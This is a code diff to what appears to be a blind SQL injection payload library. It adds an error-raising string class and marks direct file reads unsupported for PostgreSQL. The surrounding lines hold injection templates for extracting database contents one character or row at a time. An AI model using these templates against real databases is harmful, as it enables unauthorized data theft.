@@ -83,6 +83,15 @@ class HSQLDBPayloads:
         return "(SELECT {} from {} {} LIMIT 1 OFFSET {})".replace(' ', self.space).format(column, table, where, offset)
 
 
+class ErrorOnString(object):
+
+    def __init__(self, message):
+        self.message = message
+
+    def __str__(self):
+        raise Exception(self.message)
+
+
 class PGSQLPayloads:
 
     def __init__(self, prefix='', space=' '):
@@ -97,7 +106,7 @@ class PGSQLPayloads:
         self.and_char_at_lt = self.prefix + self.space + "ascii(SUBSTRING({},{},1))<{}"
         self.and_char_at_gt = self.prefix + self.space + "ascii(SUBSTRING({},{},1))>{}"
 
-        self.str_file = "(LOAD_FILE({}))"
+        self.str_file = ErrorOnString('Postgresql do not support direct file read (try use COPY in TEMP TABLE)')
 
     def one_line_query(self, column, table, where='', offset=0):
         return "(SELECT{0}{1}{0}from{0}{2}{0}{3}{0}LIMIT{0}1{0}OFFSET{0}{4})".format(self.space, column, table, where,
